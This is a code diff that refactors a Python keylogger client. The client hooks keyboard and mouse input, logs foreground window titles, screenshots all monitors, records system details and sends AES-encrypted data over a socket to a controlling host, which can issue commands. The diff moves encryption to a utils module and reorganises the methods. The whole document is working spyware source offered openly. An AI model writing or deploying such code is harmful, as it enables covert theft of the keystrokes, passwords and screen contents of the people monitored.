@@ -1,6 +1,4 @@
 # -*- coding: utf-8 -*-
-import Crypto.Cipher.AES as aes
-import hashlib
 import keyboard
 import mouse
 import os
@@ -15,6 +13,8 @@ from screeninfo import get_monitors
 from socket import socket
 from threading import Thread
 from win32gui import GetWindowText, GetForegroundWindow
+
+import utils
 
 class Keylogger:
     def __init__(self, log_interval, window_interval, reconnect_interval):
@@ -38,8 +38,9 @@ class Keylogger:
 
         self.log_directory = "tmp" #"C:\\tmp"
 
-        ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
+        ImageGrab.grab = partial(ImageGrab.grab, all_screens=True) # Take Screenshots of all Screens at once
 
+#--------------- CALLBACK FUNCTIONS ---------------#
     def keyboard_callback(self, event):
         name = event.name
         if len(name) > 1:
@@ -60,24 +61,7 @@ class Keylogger:
     def mouse_right_callback(self):
         self.log += f"[R_CLICK, {mouse.get_position()}]"
 
-    def write_keylogs_to_file(self, foreground_window):
-        if self.log:
-            if not os.path.exists(self.log_directory):
-                os.makedirs(self.log_directory)
-
-            filename = f"keylog-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.txt"
-            with open(os.path.join(self.log_directory, filename), "w", encoding="utf-8") as file:
-                file.write((
-                        f"Foreground Window: {foreground_window}\n"
-                        f"Starttime: {self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}\n"
-                        f"Endtime: {self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}\n"
-                        f"Filecounter: {self.filecounter}\n"
-                        f"------------------------\n\n"
-                        f"{self.log}"
-                    ))
-            self.start_time = datetime.now()
-        self.log = ""
-
+#--------------- WRITE FUNCTIONS ---------------#
     def write_information_file(self):
         if not os.path.exists(self.log_directory):
                 os.makedirs(self.log_directory)
@@ -107,32 +91,32 @@ class Keylogger:
                         f"Processor: {uname.processor}\n"
                     ))
 
-    def make_screenshot(self):
+    def write_keylogs_to_file(self, foreground_window):
+        if self.log:
+            if not os.path.exists(self.log_directory):
+                os.makedirs(self.log_directory)
+
+            filename = f"keylog-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.txt"
+            with open(os.path.join(self.log_directory, filename), "w", encoding="utf-8") as file:
+                file.write((
+                        f"Foreground Window: {foreground_window}\n"
+                        f"Starttime: {self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}\n"
+                        f"Endtime: {self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}\n"
+                        f"Filecounter: {self.filecounter}\n"
+                        f"------------------------\n\n"
+                        f"{self.log}"
+                    ))
+            self.start_time = datetime.now()
+        self.log = ""
+
+    def screenshot(self):
         if not os.path.exists(self.log_directory):
                 os.makedirs(self.log_directory)
         
         filename = f"screenshot-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.png"
         pyautogui.screenshot(os.path.join(self.log_directory, filename))
 
-    def check_foreground_window(self):
-        while self.active:
-            current_window = GetWindowText(GetForegroundWindow())
-            timenow = datetime.now()
-
-            if current_window != self.foreground_window:
-                self.write_keylogs_to_file(self.foreground_window)
-                self.make_screenshot()
-                self.foreground_window = current_window
-                self.filecounter = 0
-
-            elif (timenow - self.start_time) >= timedelta(seconds=self.log_interval):
-                self.end_time = timenow
-                self.write_keylogs_to_file(current_window)
-                self.make_screenshot()
-                self.filecounter += 1
-
-            time.sleep(self.window_interval)
-
+#--------------- SERVER FUNCTIONS ---------------#
     def connect_to_host(self):
         while not self.connected:
             try:
@@ -143,7 +127,7 @@ class Keylogger:
                 time.sleep(self.reconnect_interval)
 
     def send_to_host(self, data):
-        encrypted_data = self.encrypt(data)
+        encrypted_data = utils.encrypt(data)
 
         try:
             self.sock.sendall(encrypted_data)
@@ -151,41 +135,33 @@ class Keylogger:
             self.connected = False
             self.connect_to_host()
 
-    def send_keylog_files_to_host(self):
-        self.send_to_host(b'data')
+    def receive_from_host(self):
+        recv = utils.decrypt(self.sock.recv(1024))
+        if recv:
+            return str(recv)[2:-1]
+        return None
+    
+#--------------- POLLING FUNCTIONS ---------------#
+    def check_foreground_window(self):
+        while self.active:
+            current_window = GetWindowText(GetForegroundWindow())
+            timenow = datetime.now()
 
-    def encrypt(self, fileName):
-        openFile = open(".\client.py", "r")
-        fileContent = bytes(openFile.read(), encoding = "utf-8")
-        #key = hashlib.sha256(fileContent).hexdigest().encode("utf8")[4:20]
-        key = b'\xe9\xcex8\x01\x98\xc5Z\xed\xd0F\xff\xff\xff\xff\xff'
-        cipher = aes.new(key, aes.MODE_EAX)
-        nonce = cipher.nonce
+            if current_window != self.foreground_window:
+                self.write_keylogs_to_file(self.foreground_window)
+                self.screenshot()
+                self.foreground_window = current_window
+                self.filecounter = 0
 
-        if(fileName[-4:] == ".txt"):
-            file = open(fileName, "r")
-            fileData = file.read().encode("ascii")
-        elif(fileName[-4:] == ".png"):
-            file = open(fileName, "rb")
-            fileData = file.read()
-        else:
-            fileData = fileName
+            elif (timenow - self.start_time) >= timedelta(seconds=self.log_interval):
+                self.end_time = timenow
+                self.write_keylogs_to_file(current_window)
+                self.screenshot()
+                self.filecounter += 1
 
-        cipherText, tag = cipher.encrypt_and_digest(fileData)
-        return nonce + tag + cipherText
+            time.sleep(self.window_interval)
 
-    def decrypt(self, cipherText):
-        key = b'\xe9\xcex8\x01\x98\xc5Z\xed\xd0F\xff\xff\xff\xff\xff'
-        sNonce = cipherText[:16]
-        sTag = cipherText[16:32]
-        cipher = aes.new(key, aes.MODE_EAX, nonce = sNonce)
-        plainText = cipher.decrypt(cipherText[32:])
-        try:
-            cipher.verify(sTag)
-            return plainText
-        except:
-            return "Message corrupted."
-
+#--------------- START / STOP ---------------#
     def start(self):
         self.active = True
         self.write_information_file()
@@ -194,27 +170,27 @@ class Keylogger:
         mouse.on_click(callback=self.mouse_left_callback)
         mouse.on_right_click(callback=self.mouse_right_callback)
 
-        foreground_window_thread = Thread(target=self.check_foreground_window)
-        foreground_window_thread.start()
+        t = Thread(target=self.check_foreground_window)
+        t.start()
 
-        self.connect_to_host()
+    def stop(self):
+        self.active = False
+        self.send_to_host(b'terminated')
+        self.sock.close()
 
-        while True:
-            recv = self.decrypt(self.sock.recv(1024))
-            if recv:
-                recv = str(recv)[2:-1]
 
-                if recv == "exit":
-                    self.send_to_host(b'terminating')
-                    self.sock.close()
-                    self.active = False
-                    break
-                elif recv == "send":
-                    self.send_keylog_files_to_host()
-                else:
-                    self.send_to_host(b'received')
-                    print(recv)
-
+#--------------- MAIN ---------------#
 if __name__ == "__main__":
     keylogger = Keylogger(log_interval=15, window_interval=0.25, reconnect_interval=5)
     keylogger.start()
+    keylogger.connect_to_host()
+
+    while True:
+        recv = keylogger.receive_from_host()
+        if recv:
+            if recv == "exit":
+                keylogger.stop()
+                break
+            else:
+                keylogger.send_to_host(b'received')
+                print(recv)
